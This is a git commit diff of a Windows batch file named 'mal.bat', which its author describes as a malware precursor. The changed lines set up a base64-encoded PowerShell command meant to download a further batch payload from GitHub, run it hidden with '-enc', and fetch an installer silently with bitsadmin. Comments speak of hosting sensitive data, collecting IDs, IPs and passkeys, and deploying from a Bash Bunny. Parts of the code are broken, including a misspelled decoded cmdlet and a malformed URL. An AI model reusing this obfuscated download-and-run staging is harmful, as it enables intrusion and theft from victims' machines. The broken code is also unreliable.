967f0f75b5defb49ff7241c0748c76880835dec3
bwebb3234 <bwebb3239@gmail.com>
2024-11-08 11:50:32 -0800

    Update mal.bat
    Updated and revised.

--- mal.bat
+++ mal.bat
@@ -1,3 +1,5 @@
+@echo off
+
 REM the precursor to my elite malware, creates a directory then moves to it downloads more mal from github and hosts sensitive data on a webserver
 
 REM create the directory
@@ -13,14 +15,13 @@ REM I have the shell encoded in base64 and stored as a powershell vatiable
 REM think about it . powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bwebb3234/bwebb3234//main/mal.bat' -OutFile malzs1.ba
 
 REM base64 web request encoded variable to use
-$encodedCommand = "SW52b2xlLVdlc3RDaHJvd2UgLVVyaSAnaHR0cHM6Ly9naXRodWJ8L2J3ZWJiMzIzNC9id2VibjMyMzQvbWFsLmJhdCcgLU91dEZpbGUgbWFsemMxLmJhdA=="
+set encodedCommand="SW52b2xlLVdlc3RDaHJvd2UgLVVyaSAnaHR0cHM6Ly9naXRodWJ8L2J3ZWJiMzIzNC9id2VibjMyMzQvbWFsLmJhdCcgLU91dEZpbGUgbWFsemMxLmJhdA=="
 
-powershell -Command -enc $encodedCommand
+powershell -Command -enc %encodedCommand%
 REM What does it do next--jot ids and ips. get xp--user passkey.
 
 REM silently run this but first modify it. notice the source and destination, is that right?
-@echo off
-bitsadmin.exe /transfer myDownloadJob https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe "C:Users\bwebb\myMal\python-installer.exe" /quiet InstallAllUsers=1 PrependPath=1
+bitsadmin.exe /transfer myDownloadJob https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe "C:\Users\bwebb\myMal\python-installer.exe" /quiet InstallAllUsers=1 PrependPath=1
 
 
 REM don't forget to run this off the bash bunny and don't forget stage one and two--aomei and kaley.
